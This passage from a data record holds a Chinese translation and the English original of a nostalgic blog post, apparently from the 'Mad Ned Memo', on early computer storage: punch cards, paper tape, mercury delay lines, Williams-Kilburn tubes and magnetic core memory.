\u95ee\u9898\u3002\u867d\u7136 1940 \u5e74\u4ee3\u7684\u8ba1\u7b97\u673a\u8db3\u591f\u6162\uff0c\u4f46\u5f53\u65f6\u8bb8\u591a\u8fd9\u4e9b\u95ee\u9898\u90fd\u4e0d\u662f\u95ee\u9898\u3002\u8fd9\u5e76\u4e0d\u662f\u8bf4\u6240\u8c13\u7684\u5ef6\u8fdf\u7ebf\u5b58\u50a8\u5668\u5f88\u5bb9\u6613\u8bbe\u8ba1\u3002\u6709\u5f88\u591a\u95ee\u9898\uff0c\u9996\u5148\u662f\u8fde\u7ebf\uff0c\u5373\u4f7f\u662f\u957f\u8fde\u7ebf\uff0c\u4e5f\u4e0d\u80fd\u957f\u65f6\u95f4\u5b58\u50a8\u4fe1\u606f\u3002\u4ed6\u4eec\u901a\u8fc7\u6784\u5efa\u66f4\u6162\u7684\u4f20\u64ad\u7535\u8def\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u4f7f\u7528\u7535\u5bb9\u5668\u94fe\u6765\u5f62\u6210\u7535\u5ef6\u8fdf\u7ebf\u3002\u5b83\u4e0d\u80fd\u5b58\u50a8\u5f88\u591a\u4f4d\uff0c\u4f46\u6bd4\u673a\u68b0\u5b58\u50a8\u76f8\u5bf9\u4fbf\u5b9c\u4e14\u901f\u5ea6\u66f4\u5feb\u3002\u7136\u540e\u4e8b\u60c5\u53d8\u5f97\u5f88\u5947\u602a\u3002\u8fd9\u4e2a\u9886\u57df\u7684\u4e0b\u4e00\u4e2a\u53d1\u660e\u662f\u4e00\u79cd\u53eb\u505a\u6c34\u94f6\u5ef6\u8fdf\u7ebf\u7684\u4e1c\u897f\uff0c\u5b83\u57fa\u672c\u4e0a\u662f\u4e00\u4e2a\u5927\u7f50\u7684\u6db2\u6001\u6c34\u94f6\uff0c\u4e00\u7aef\u662f\u538b\u7535\u6676\u4f53\uff0c\u53e6\u4e00\u7aef\u662f\u9ea6\u514b\u98ce\u3002\u6676\u4f53\u4f1a\u4ea7\u751f\u4f1a\u901a\u8fc7\u6c34\u94f6\u4f20\u64ad\u7684\u7d27\u675f\u58f0\u6ce2\uff0c\u6c34\u94f6\u5bf9\u58f0\u97f3\u4e0e\u7a7a\u6c14\u6216\u6c34\u7684\u4f20\u64ad\u901f\u7387\u975e\u5e38\u9ad8\uff081450 m/s \u5bf9\u7a7a\u6c14\u7684 340 m/s\uff09\u3002\u58f0\u97f3\u8109\u51b2\u5c06\u4f5c\u4e3a\u4e32\u884c\u6d41\u4f20\u8f93\u5230\u7f50\u4e2d\uff0c\u5e76\u8bfb\u51fa\u53e6\u4e00\u7aef\uff0c\u653e\u5927\u3001\u4fee\u6539\u3001\u53cd\u9988\u3002\u5fc5\u987b\u4ed4\u7ec6\u9009\u62e9\u7ba1\u7684\u957f\u5ea6\uff0c\u4f7f\u7cfb\u7edf\u7684\u5faa\u73af\u65f6\u95f4\u7b26\u5408CPU \u65f6\u949f\u9891\u7387\uff0c\u5e76\u4e14\u9700\u8981\u591a\u4e2a\u7ba1\u6765\u5b58\u50a8\u8d85\u8fc7\u4e00\u767e\u4f4d\u5de6\u53f3\u7684\u4efb\u4f55\u5185\u5bb9\u3002\u5230 1950 \u5e74\u4ee3\u521d\uff0c\u8ba1\u7b97\u673a\u53d8\u5f97\u8db3\u591f\u590d\u6742\uff0c\u9700\u8981\u66f4\u591a\u7684\u5b58\u50a8\u7a7a\u95f4\u548c\u66f4\u5feb\u7684\u5b58\u50a8\u7a7a\u95f4\u3002\u5ef6\u8fdf\u7ebf\u7684\u5bb9\u91cf\u76f8\u5f53\u6709\u9650\uff0c\u5e76\u4e14\u901a\u8fc7\u67d0\u79cd\u4ecb\u8d28\u4f20\u64ad\u7684\u7535\u6ce2\u6216\u58f0\u6ce2\u7684\u5ef6\u8fdf\u9020\u6210\u4e86\u57fa\u672c\u7684\u8bbf\u95ee\u65f6\u95f4\u9650\u5236\uff0c\u8fd9\u963b\u788d\u4e86 CPU \u7684\u541e\u5410\u91cf\u3002\u518d\u52a0\u4e0a\u5185\u5b58\u8bbf\u95ee\u7684\u4e32\u884c\u65b9\u9762\u7684\u95ee\u9898\uff0c\u751a\u81f3\u4e0d\u8981\u5f00\u59cb\u8003\u8651\u62e5\u6709\u6240\u6709\u6c5e\u7684\u6bd2\u6027\u95ee\u9898\u3002\u957f\u8bdd\u77ed\u8bf4\uff0c\u5f53\u65f6\u7684\u8ba1\u7b97\u673a\u5de5\u7a0b\u5e08\u8fd8\u4e0d\u6ee1\u610f\uff08\u4ed6\u4eec\u6c38\u8fdc\u4e0d\u4f1a\u6ee1\u610f\uff0c\u76f8\u4fe1\u6211\uff09\uff0c\u5e76\u7ee7\u7eed\u5bfb\u627e\u5176\u4ed6\u5947\u602a\u800c\u53e4\u602a\u7684\u65b9\u5f0f\u6765\u5b58\u50a8\u6570\u636e\uff0c\u5373\u4f7f\u6ca1\u6709\u534a\u5bfc\u4f53\u3002\n\u4ed6\u4eec\u60f3\u51fa\u7684\u4e0b\u4e00\u4ef6\u4e8b\u662f\u6211\u4e2a\u4eba\u7684\u6700\u7231\u4e4b\u4e00\uff0c\u79f0\u4e3a\u5a01\u5ec9\u59c6\u65af-\u57fa\u5c14\u672c\u7ba1\u2014\u2014\u7531\uff08\u4ee4\u4eba\u60ca\u8bb6\u7684\uff09\u5f17\u96f7\u5fb7\u00b7\u5a01\u5ec9\u59c6\u65af\u548c\u6c64\u59c6\u00b7\u57fa\u5c14\u672c\u4e8e 1948 \u5e74\u53d1\u660e\u3002\u8be5\u8bbe\u5907\u57fa\u672c\u4e0a\u662f\u4e00\u4e2a CRT \u7ba1\uff0c\u4e0e\u60a8\u5728\u65e7\u7535\u89c6\u4e2d\u770b\u5230\u7684\u975e\u5e38\u76f8\u4f3c\uff0c\u5e76\u4e14\u53ef\u4ee5\u5c06\u6570\u636e\u4f4d\u6295\u5f71\u4e3a\u7ba1\u7684 x/y \u7f51\u683c\u4e0a\u7684\u70b9\u3002\u867d\u7136\u4e00\u4e9b\u7ba1\u5b50\u5185\u90e8\u6d82\u6709\u78f7\u5149\u4f53\uff0c\u4f46\u4fdd\u6301\u4f4d\u72b6\u6001\u7684\u5e76\u4e0d\u662f\u6765\u81ea\u70b9\u7684\u5149\uff0c\u800c\u662f\u7535\u5b50\u67aa\u53d1\u5c04\u65f6\u5728\u5c4f\u5e55\u4e0a\u4ea7\u751f\u7684\u4e8c\u6b21\u7535\u8377\u3002\u5199\u5165\u7684\u4efb\u4f55\u7279\u5b9a\u70b9\u7684\u7535\u8377\u90fd\u9700\u8981\u4e00\u6bb5\u65f6\u95f4\u624d\u80fd\u8870\u51cf\uff0c\u5728\u6b64\u671f\u95f4\uff0cCRT \u524d\u9762\u7684\u68c0\u6d4b\u5668\u677f\u4f1a\u8bfb\u53d6\u70b9\u7684\u503c\uff0c\u5e76\u5c06\u4efb\u4f55\u9010\u6e10\u6d88\u5931\u7684\u201c1\u201d\u5199\u5165\u6ee1\u7535\u8377\u8017\u5c3d\u524d\u7684\u7535\u8377\u5f3a\u5ea6\u3002\u5982\u679c\u8fd9\u542c\u8d77\u6765\u771f\u7684\u50cf hacky / Rube Goldberg \u4e00\u6837\uff0c\u8bf7\u8bb0\u4f4f\uff0c\u6b64\u539f\u7406\u4e0e\u73b0\u4ee3\u52a8\u6001 ram \u975e\u5e38\u76f8\u4f3c\uff0c\u540e\u8005\u4e34\u65f6\u5b58\u50a8\u7535\u8377\uff0c\u5e76\u4e14\u8fd8\u9700\u8981\u5b9a\u671f\u8fdb\u884c\u5237\u65b0\u5faa\u73af\u4ee5\u91cd\u5199\u503c\u3002\u65e0\u8bba\u5982\u4f55\uff0c\u8fd9\u79cd\u5b58\u50a8\u5668\u5728\u6821\u51c6\u3001\u78e8\u635f\u548c\u5176\u4ed6\u65b9\u9762\u5b58\u5728\u5404\u79cd\u95ee\u9898\uff0c\u4f46\u5b83\u53ef\u4ee5\u8bf4\u662f\u7b2c\u4e00\u4e2a\u53d1\u660e\u7684\u7535\u5b50\u968f\u673a\u5b58\u53d6\u5b58\u50a8\u5668\uff0c\u5b83\u6bd4\u5ef6\u8fdf\u7ebf\u7b49\u65e7\u65b9\u6cd5\u5177\u6709\u5de8\u5927\u7684\u4f18\u52bf\u3002\u5728 1940 \u5e74\u4ee3\u672b\u548c 1950 \u5e74\u4ee3\u521d\uff0c\u5a01\u5ec9\u59c6\u65af-\u57fa\u5c14\u672c\u7ba1\u6210\u529f\u5730\u7528\u4e8e IBM \u548c\u5176\u4ed6\u516c\u53f8\u5236\u9020\u7684\u51e0\u53f0\u5546\u7528\u8ba1\u7b97\u673a\u4e0a\u3002\u534a\u5bfc\u4f53\u524d\u5b58\u50a8\u9886\u57df\u771f\u6b63\u7684\u6e38\u620f\u89c4\u5219\u6539\u53d8\u8005\u662f\u5728 1951 \u5e74\u5de6\u53f3\uff0c\u5f53\u65f6\u5b89\u738b\u548c\u5176\u4ed6\u4eba\u5f00\u53d1\u4e86\u78c1\u82af\u5b58\u50a8\u5668\u3002\u6838\u5fc3\u662f\u4e00\u79cd\u7531\u73af\u5f62\u94c1\u6c27\u4f53\u78c1\u73e0\u77e9\u9635\u7ec4\u6210\u7684\u6280\u672f\uff0c\u8be5\u78c1\u73e0\u53ef\u4ee5\u6839\u636e\u901a\u8fc7\u78c1\u73e0\u4e32\u6210\u7684\u884c\u548c\u5217\u7ebf\u611f\u5e94\u5230\u6bcf\u4e2a\u78c1\u73e0\u4e2d\u7684\u78c1\u573a\u6781\u6027\u6765\u4fdd\u6301\u72b6\u6001\u3002\u4e0e\u5a01\u5ec9\u59c6\u65af\u7ba1\u4e00\u6837\uff0c\u6838\u5fc3\u5185\u5b58\u53ef\u4ee5\u968f\u673a\u8bbf\u95ee\uff0c\u4f46\u901f\u5ea6\u66f4\u5feb\uff0c\u901a\u5e38\u66f4\u53ef\u9760\uff0c\u4fe1\u606f\u5bc6\u5ea6\u66f4\u5927\u3002\u4e0e\u5176\u524d\u8f88\u4e0d\u540c\uff0c\u65e0\u8bba\u5927\u5c0f\u5982\u4f55\uff0c\u8fd0\u884c\u6838\u5fc3\u5185\u5b58\u6240\u9700\u7684\u7535\u91cf\u901a\u5e38\u90fd\u662f\u6301\u5e73\u7684\uff0c\u5e76\u4e14\u4f7f\u7528\u8be5\u6280\u672f\u53ef\u4ee5\u5b9e\u73b0\u66f4\u5927\u7684\u6570 KB \u7cfb\u7edf\u3002\u4f46\u662f\u6709\u51e0\u4e2a\u7f3a\u70b9\u3002\u7b2c\u4e00\u4e2a\u95ee\u9898\u662f\u94c1\u6c27\u4f53\u78c1\u73e0\u7684\u5236\u9020\u6210\u672c\u5f88\u9ad8\uff0c\u5e76\u4e14\u5fc5\u987b\u4e00\u6b21\u4e00\u70b9\u5730\u624b\u5de5\u4e32\u8d77\u6765\u3002\u4ece 1950 \u5e74\u4ee3\u5f00\u59cb\uff0c\u4e00\u76f4\u5230 1970 \u5e74\u4ee3\u4e2d\u671f\u534a\u5bfc\u4f53 RAM \u7cfb\u7edf\u63a5\u7ba1\u65f6\uff0c\u5de5\u5382\u5de5\u4eba\u7684\u519b\u961f\uff0c\u901a\u5e38\u662f\u5973\u6027\uff0c\u56e0\u4e3a\u5979\u4eec\u7684\u624b\u8f83\u5c0f\u4e14\u8fd0\u52a8\u6280\u80fd\u597d\uff0c\u56e0\u6b64\u4e00\u76f4\u81f4\u529b\u4e8e\u7ec4\u88c5\u8fd9\u4e9b\u7cfb\u7edf\u3002\u90a3\u65f6\u7684\u8ba1\u7b97\u673a\u4e00\u822c\u90fd\u662f\u624b\u5de5\u5236\u4f5c\u7684\uff0c\u4f46\u4e5f\u975e\u5e38\u6602\u8d35 - \u56e0\u6b64\uff0c\u8003\u8651\u5230\u5185\u6838\u63d0\u4f9b\u7684\u589e\u5f3a\u529f\u80fd\uff0c\u4e3a\u5185\u6838\u652f\u4ed8\u4e00\u70b9\u989d\u5916\u8d39\u7528\u5e76\u4e0d\u662f\u4ec0\u4e48\u5927\u4e0d\u4e86\u7684\u4e8b\u3002\u78c1\u82af\u7684\u7b2c\u4e8c\u4e2a\u95ee\u9898\u662f\uff0c\u7528\u4e8e\u8bfb\u53d6\u94c1\u6c27\u4f53\u78c1\u73e0\u7684\u8fc7\u7a0b\u4e5f\u53cd\u8f6c\u4e86\u78c1\u573a\uff0c\u6709\u6548\u5730\u64e6\u9664\u4e86\u4f4d\u7684\u72b6\u6001\u3002\u8fd9\u5c31\u662f An Wang \u7684\u7528\u6b66\u4e4b\u5730\uff0c\u56e0\u4e3a\u4ed6\u4e3a\u8fd9\u4e2a\u95ee\u9898\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7535\u8def\u89e3\u51b3\u65b9\u6848\uff0c\u8be5\u89e3\u51b3\u65b9\u6848\u4e3a\u5185\u6838\u8bbf\u95ee\u5f15\u5165\u4e86\u5148\u8bfb\u540e\u5199\u5468\u671f\uff0c\u8fd9\u662f\u4e00\u79cd\u4ec5\u5728\u8bfb\u53d6\u5185\u5b58\u65f6\u53d1\u751f\u7684\u79bb\u6563\u5237\u65b0\u3002\n\u5c3d\u7ba1\u6709\u4efb\u4f55\u6210\u672c\u6216\u602a\u7656\uff0c\u4f46\u6838\u5fc3\u8fd8\u662f\u5728\u5546\u4e1a\u4e0a\u5927\u53d7\u6b22\u8fce\uff0c\u8bb8\u591a\u8ba1\u7b97\u673a\uff0c\u5305\u62ec\u6211\u7528\u6765\u6253\u4e0a\u56fe\u4e2d\u7eb8\u5e26\u7684\u5927\u7ea6 1974 \u5e74\u7684 PDP-8\uff0c\u90fd\u5728\u6838\u5fc3\u4e0a\u8fd0\u884c\uff08\u5982\u679c\u6211\u6ca1\u8bb0\u9519\u7684\u8bdd\uff0c\u662f 32K \u9635\u5217\uff09\u3002 core \u7684\u53e6\u4e00\u4e2a\u6709\u8da3\u7684\u7279\u6027\u662f\u5b83\u662f\u4e00\u4e2a\u975e\u6613\u5931\u6027\u7cfb\u7edf\uff0c\u4e0d\u50cf\u5b83\u7684\u5927\u591a\u6570\u524d\u8f88\u3002\u6bcf\u4e2a\u94c1\u6c27\u4f53\u78c1\u73e0\u4e2d\u7684\u78c1\u573a\u90fd\u76f8\u5f53\u6301\u4e45\uff0c\u9664\u975e\u6838\u5fc3\u7cfb\u7edf\u66b4\u9732\u5728\u5f3a\u78c1\u6e90\u4e0b\uff0c\u5426\u5219\u5373\u4f7f\u6ca1\u6709\u7535\u6e90\uff0c\u5b58\u50a8\u5668\u7684\u72b6\u6001\u4e5f\u5e94\u8be5\u51e0\u4e4e\u65e0\u9650\u671f\u5730\u6301\u7eed\u4e0b\u53bb\u3002\u8fd9\u610f\u5473\u7740\u6240\u6709\u5b58\u50a8\u5728\u67d0\u4e2a\u5730\u65b9\u3001\u535a\u7269\u9986\u3001\u5783\u573e\u586b\u57cb\u573a\u6216\u4efb\u4f55\u5730\u65b9\u7684\u65e7\u8ba1\u7b97\u673a\uff0c\u53ef\u80fd\u4ecd\u7136\u5305\u542b\u5b83\u4eec\u8fd0\u884c\u8fc7\u7684\u6700\u540e\u4e00\u4e2a\u7a0b\u5e8f\u3002\u5982\u679c\u60a8\u80fd\u627e\u5230\u4e00\u79cd\u65b9\u6cd5\u6765\u542f\u52a8\u7535\u6e90\uff0c\u90a3\u4e48\u8be5\u4ee3\u7801\u5b9e\u9645\u4e0a\u53ef\u4ee5\u518d\u6b21\u8fd0\u884c\u3002\u6838\u5fc3\u4e4b\u540e\u662f MOS \u548c CMOS \u5b58\u50a8\u5668\uff0c\u4ee5\u9759\u6001\u548c\u52a8\u6001 RAM\u3001EEPROMS \u548c\u4e00\u4e9b\u4ece\u672a\u6d41\u884c\u8fc7\u7684\u78c1\u6ce1\u5b58\u50a8\u5668\u7b49\u5947\u602a\u7684\u4e1c\u897f\u7684\u5f62\u5f0f\u51fa\u73b0\u3002\u4f46\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c1970 \u5e74\u4ee3\u7684\u8bb0\u5fc6\u7cfb\u7edf\u4e0e\u6211\u4eec\u4eca\u5929\u62e5\u6709\u7684\u975e\u5e38\u76f8\u4f3c\u3002\u66f4\u5c0f\u3001\u66f4\u5feb\uff0c\u5177\u6709\u8bb8\u591a\u521b\u65b0\u589e\u5f3a\u529f\u80fd\uff0c\u4f46\u57fa\u672c\u6280\u672f\u57fa\u672c\u76f8\u540c\u3002\u5982\u524d\u6240\u8ff0\uff0c\u6211\u5728\u65e9\u671f\u7684\u786c\u4ef6\u5de5\u7a0b\u65f6\u4ee3\u90fd\u5728\u8bbe\u8ba1\u5185\u5b58\u7cfb\u7edf\uff0c\u6211\u6709\u70b9\u9057\u61be\u6211\u6ca1\u6709\u5f00\u59cb\u7814\u7a76\u8fd9\u4e9b\u5728\u6211\u4e4b\u524d\u51fa\u73b0\u7684\u5947\u602a\u800c\u5947\u5999\u7684\u91ce\u517d\u4e2d\u7684\u4efb\u4f55\u4e00\u4e2a\u3002\u4f46\u6211\u6709\u70b9\u5e0c\u671b\u4e00\u4e2a\u65b0\u7684\u3001\u5947\u602a\u7684\u5b58\u50a8\u65f6\u4ee3\u5373\u5c06\u6765\u4e34\u3002\u91cf\u5b50\u8ba1\u7b97\u4e4b\u7c7b\u7684\u4e1c\u897f\u53ef\u80fd\u4f1a\u4e3a\u5b58\u50a8\u7cfb\u7edf\u7684\u8bbe\u8ba1\u5e26\u6765\u5947\u602a\u7684\u60f3\u6cd5\u3002\u6211\u5bf9\u91cf\u5b50\u8ba1\u7b97\u6216\u7269\u7406\u5b66\u51e0\u4e4e\u4e00\u65e0\u6240\u77e5\uff0c\u53ea\u662f\u5b83\u503e\u5411\u4e8e\u6253\u7834\u4f20\u7edf\u89c4\u5219\uff0c\u5c31\u50cf\u4e8b\u7269\u4e0d\u80fd\u540c\u65f6\u4ee5\u4e24\u79cd\u72b6\u6001\u5b58\u5728\u4e00\u6837\u3002\u542c\u8d77\u6765\u50cf\u6211\u4eec\u8fd8\u6ca1\u6709\u60f3\u5230\u7684\u5f88\u68d2\u7684\u65b0\u5b58\u50a8\u7cfb\u7edf\u7684\u5de8\u5927\u6f5c\u529b\u3002\u5229\u7528\u8fd9\u6837\u7684\u65b0\u6280\u672f\u53ef\u80fd\u9700\u8981\u63d0\u51fa\u5168\u65b0\u7684\u5947\u602a\u60f3\u6cd5\u3002\u4f46\u6709\u65f6\uff0c\u5947\u602a\u7684\u4e8b\u60c5\u4f1a\u6539\u53d8\u4e16\u754c\u3002\n\u8ba1\u7b97\u673a\u6e38\u620f\u4e16\u754c\u535a\u7269\u9986\uff08\u5b8c\u6574\u7684\u5370\u5237\u7a0b\u5e8f\u95ee\u9898\uff0c\u60a8\u53ef\u4ee5\u5c3d\u60c5\u8f93\u5165\uff01\uff09\u4e0b\u4e00\u6b21\uff1a\u6211\u53ef\u80fd\u4f1a\u5192\u9669\u8fdb\u5165\u5efa\u8bae\u4e13\u680f\u9886\u57df\uff0c\u56e0\u4e3a\u6211\u5206\u4eab\u4e86\u5728\u79d1\u6280\u884c\u4e1a\u5de5\u4f5c 30 \u591a\u5e74\u6240\u5b66\u5230\u7684\u4e00\u4e9b\u4e1c\u897f\u3002\u6211\u7684\u667a\u6167\u4e4b\u73e0\u63a5\u4e0b\u6765\u51fa\u73b0\u5728\uff1a\u4e00\u4f4d\u8001\u9ed1\u5ba2\u5173\u4e8e\u4fdd\u6301\u5de5\u4f5c\u7684\u79d8\u8bc0 \u559c\u6b22\u8fd9\u7bc7\u6587\u7ae0\u5417\uff1f\u4e3a\u4ec0\u4e48\u4e0d\u8ba2\u9605\uff1f\u83b7\u53d6\u6709\u5173\u8ba1\u7b97\u673a\u6280\u672f\u3001\u8fc7\u53bb\u73b0\u5728\u548c\u672a\u6765\u7684\u5947\u602a\u800c\u53e4\u602a\u7684\u6545\u4e8b - \u5b9a\u671f\u53d1\u9001\u5230\u60a8\u7684\u6536\u4ef6\u7bb1\u3002\u5b83\u662f\u514d\u8d39\u4e14\u65e0\u5e7f\u544a\u7684\uff0c\u60a8\u53ef\u4ee5\u968f\u65f6\u53d6\u6d88\u8ba2\u9605\u3002 Mad Ned Memo \u975e\u5e38\u91cd\u89c6\u8ba2\u9605\u8005\u7684\u9690\u79c1\uff0c\u4e0d\u4f1a\u4e0e\u7b2c\u4e09\u65b9\u5171\u4eab\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u6216\u5176\u4ed6\u4fe1\u606f\u3002\u6709\u5173\u66f4\u591a\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u5355\u51fb\u6b64\u5904\u3002", "note_en": "It is tempting to spend a lot of time in this article marveling over how small and cheap computer storage has gotten versus the old days. In the 1980\u2019s when I worked for  Digital Equipment Corporation, my first job was to design memories for a mainframe computer. The system we were building could theoretically have up to 1GB of memory, but we laughed at this idea at the time, because it would require multiple refrigerator-sized cabinets and millions of dollars to build it, and who needs a gigabyte of memory, anyway?\n Now of course, a USB drive in the back of your desk drawer that is only 1GB gets thrown out for being too small, and a suitable replacement can be found for under $10 at the supermarket checkout stand. I think though that is all the time I\u2019ll devote to talking about this remarkable progression. Although it still boggles my mind every time I think about the comparison, it\u2019s a thoroughly covered topic.\n Instead I wanted to rewind even further back, and look at storage systems that are even older than the (admittedly old) stuff I usually write about. Some of these I\u2019ve actually used, but some I\u2019ve just learned about over the years.\n  Paper as a storage medium has been around a long time. Paper rolls to control musical instruments such as pianos date back to the mid 19th century. IBM got its start building machines that improved upon even older paper-card tabulators from the 1800\u2019s, expanding the size and thus storage of the existing 22-column cards to 80. They also changed the holes along the way from round to rectangular, and the  IBM punch card was born. (Also, fun fact, the reason old CRT terminals have 80 columns of text characters)\n    This format ruled the early information age from the 1920\u2019s all the way up into the 1970s. (IBM says in the link above that these cards stored all of the worlds information in the first half of the 20th century, but I think they are forgetting about books.)\n I had a brief stint of writing programs on these cards in a COBOL class in the 70\u2019s at our high school. Using cards as a programming storage medium was already becoming outmoded by then, but still alive and well in the not-so-cutting-edge public school system I was in.\n The two things I remember about it are, first, the unforgiving nature of making a mistake, which did not allow for a delete key to un-punch a hole, you just started a new card. The second is what happens if you drop your card deck. Every line of your program scatters to the floor in random order, and re-sequencing them was a pain. Each program statement would have a line number on the card so it could be figured out, but reading hundreds of cards and shuffling them around was tedious.\n If you were lucky, you could use something like an  IBM card sorter to do it, but unlikely this critical data processing center equipment would be available for your use in reassembling a deck. The pros therefore took a big magic marker and drew a diagonal stripe down the side of the deck, so you can visually spot cards out of order.\n I spent more time in the 70\u2019s with another paper format, paper tape. A paper tape punch was a common peripheral that was attached to  teletype machines, such as the Model 33 I used in school to write BASIC programs. The punch and reader both showed up as devices in the equivalent of /dev, and much like UNIX you could just redirect a program onto or off of paper tape.\n Punching and reading were dead slow, due to the mechanical speed limitations and also the fairly basic encoding used (6 bit ASCII). But it was a true read/write format, even if you could not erase and reuse the medium. And a lot easier to manage than cards since no typing was involved.\n    Last paper storage device I\u2019ll mention is the printer. You might not think of a printer as a storage device, but it was very common in the 70\u2019s and even 80\u2019s to share programs by printing them. The printer was the \u2018writer\u2019, and the \u2018reader\u2019 would be the guy having to type it back in, which was of course very slow. But many magazines and books of the time would publish programs in print to share with their readers, and I spent more than a few hours typing in BASIC programs from print, then trying to find all my typos.\n I recently found a printout of a program I wrote when I was 17, stuck in an old Computer Gaming World magazine from the 80\u2019s. It was a game I wrote, and I decided to resurrect it and see if I could get it running. (Spoiler is, I did - but I will be covering that one in another post.) The thing I find amazing about paper storage format is its longevity. Card decks and paper tape punched decades ago is still quite viable, provided you can find a way to read it, and provided it did not get wet at any time.\n     Paper is all well and good as a storage medium for the mechanical computer age, but when electronic computers came around in the 1940\u2019s, a faster solution was desirable, at least for main memory, or \u201cstore\u201d as it was more commonly referred to back then. If you think of punch cards as being the large-capacity \u201cdisk storage\u201d of the day, it still left a need for a smaller, faster storage device for programs and data that could keep up with the processor (like dynamic ram systems of today).\n Mechanical solutions were out \u2014 and electronic ones in. But there was a problem of scale, since integrated circuits were still twenty years away, and even the transistor had not been invented yet. Register circuits made out of tubes could be constructed, but it would take at minimum 4-5 tubes and associated discrete components to store a single bit. This was fast but required a lot of space, and a lot of power. Tens of thousands of tubes just to store a kilobyte of data, creating all sorts of cost, power, thermal, and reliability problems.\n The motivation to build a smaller storage device was high, so they got creative about where they could keep all their bits around for a while. One of the earliest solutions was, to use a wire. Slightly more complex, but basically, a wire. The idea was based off of the principal of wave propagation, where an electrical pulse would take time to travel down a conductor, and if the conductor was long enough, several pulses representing bits could be stored in the wire as they travelled.\n This technical area is also referred to as transmission line theory, and it later haunted systems engineers like me, because the effects of signals propagating in wires can lead to delays and even reflections that cause timing and signal integrity problems for fast circuits. The computers of the 1940s though were slow enough that many of these issues were not a problem then.\n This is not to say that  delay line memory as it was called, was an easy thing to engineer. There were many problems, the first of which being that a wire, even a long wire, does not store information for very long. They got around this by building even slower propagation circuits, using chains of capacitors to form an electric delay line. It could not store a lot of bits, but was relatively cheap and faster than mechanical storage.\n Then things get really strange. The next invention in this area was something called a  mercury delay line, which was basically a big tank of liquid mercury with a piezoelectric crystal on one end, and a microphone on the other. The crystal would produce a tight-beam sound wave that would propagate through the mercury, which has a very high propagation rate for sound vs. air or water (1450 m/s vs. 340 m/s for air).\n Pulses of sound would be transmitted into the tank as a serial stream, and read out the other end, amplified, modified, fed back in. Length of the tube had to be carefully selected so the cycle time of the system was in line with the CPU clock rate, and multiple tubes were needed to store anything more than a hundred or so bits.\n    By the early 1950\u2019s computers were getting complex enough that they needed more storage, and faster storage. Delay lines were rather limited in capacity, and the latency of electrical or sound waves propagating through some medium created a fundamental access time limit that was getting in the way of CPU throughput. Add to that the issues with the serial aspect of memory access, and don\u2019t even start to think about the toxicity issues of having all that mercury around.\n Long way of saying, computer engineers of the day were not satisfied yet (they never are, trust me) and went on to find other weird and wacky ways to store data, even in the absence of semiconductors.\n The next thing they came up with is one of my personal favorites, something called the  Williams-Kilburn Tube \u2014 Invented in 1948 by (surprise) Fred Williams and Tom Kilburn. This device was basically a CRT tube very similar to one you would find in an old television, and bits of data could be projected as dots on an x/y grid of the tube. Although some tubes were coated inside with phosphor, it was not the light from the dots that held the state of the bits, but rather the secondary electrical charge produced on the screen when the electron gun fired.\n The charge for any particular dot that was written would take a while to decay, and in the intervening time, a detector plate in front of the CRT would read the values of the dots, and write any \u201cones\u201d that were fading back to full charge strength before the charge was depleted. If that sounds really hacky /  Rube Goldberg-like, keep in mind that this principle is very similar to modern-day dynamic ram, which stores charge temporarily and also requires a refresh cycle to occur periodically to rewrite values.\n Anyway this memory had all sorts of issues with calibration, wear-out, and other things, but it was arguably the first electronic random-access memory invented, which had huge advantages over older approaches like delay lines. Williams-Kilburn tubes were successfully used on several commercial computers made by IBM and others in the late 1940\u2019s and early 1950\u2019s.\n     The real game-changer of the pre-semiconductor storage scene though would come in 1951 or so, when  magnetic core memory was developed by  An Wang and others. Core was a technology consisting of a matrix of donut-shaped ferrite beads that could hold state based on the polarity of a magnetic field that was induced into each one, via row and column wires strung through the beads.\n Like the Williams Tube, core memory was randomly-accessible, but faster and generally more reliable, and with a greater information density. The amount of power needed to operate a core memory was generally flat regardless of the size, unlike its predecessors, and larger, multi-kilobyte systems were feasible with the technology. But there were a couple of downsides.\n The first issue was that ferrite beads were expensive to make, and had to be hand strung, one bit at a time. Armies of factory workers, usually women because of their smaller hands and fine motor skills, worked to assemble these systems from the 1950\u2019s, all the way into the mid 1970s when semiconductor RAM systems took over. Computers in general were hand made back then, and also very expensive though - so a little extra expense for core was not too big a deal, given the increased capability afforded by it.\n The second issue with core was, the process used to read the ferrite beads also reversed the magnetic field, effectively erasing the state of the bit. This is where An Wang comes in though, because he contributed a circuit solution for this problem that introduced a read-then-write cycle for core access, kind of a discrete refresh that only takes place when the memory was read.\n Despite any costs or quirks, core was a commercial hit, and many computers, including the circa 1974  PDP-8 I used to punch that paper tape in the picture above, ran on core (a 32K array, if I remember right).\n Another interesting property of core was that it is a non-volatile system, unlike most of its predecessors. The magnetic field in each ferrite bead is quite durable, and unless the core system is exposed to a strong magnetic source, the state of the memory should last almost indefinitely, even with no power.\n That means that all those old computers in storage somewhere, in museums, in landfills or wherever they may be, likely still contain the last program they ever ran. And If you could find a way to power one on, that code could actually run again.\n    After core came MOS and CMOS memory in the form of static and dynamic RAM, EEPROMS, and a few oddball things like  magnetic bubble memory that never caught on. But for the most part, memory systems of the 1970\u2019s are very similar to the ones we have today. Smaller, faster, with a host of innovative enhancements, but essentially the same base technologies.\n As mentioned I spent my early hardware engineering days designing memory systems, and I\u2019m just a little sad I didn\u2019t get to work on any of these weird and wonderful beasts that came before my time. But I\u2019m a little hopeful that a new, weird age of storage may soon be upon us.\n Things like  quantum computing will likely bring back strange ideas to design of storage systems. I know close to nothing about quantum computing or physics, except that it tends to break traditional rules, like things cannot exist in two states at the same time. Sounds like a great potential for awesome new storage systems we haven\u2019t even thought of yet.\n Taking advantage of new technology like this may require coming up with a whole new crop of weird ideas. But sometimes, weird changes the world.\n   Computer Gaming World Museum (full issues with printed programs you can have fun typing in!)\n Next Time: I perhaps risk venturing into advice column territory, as I share some things learned over 30-something years working in the tech industry. My pearls of wisdom coming up next in:  An Old Hacker\u2019s Tips on Staying Employed\n  Enjoyed this post? Why not subscribe? Get strange and nerdy tales of computer technology, past present and future - delivered to your inbox regularly. It\u2019s cost-free and ad-free, and you can unsubscribe any time.\n  The Mad Ned Memo takes subscriber privacy seriously, and does not share email addresses or other information with third parties. For more details,   click here .", "posttime": "2021-08-05 20:53:03", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": 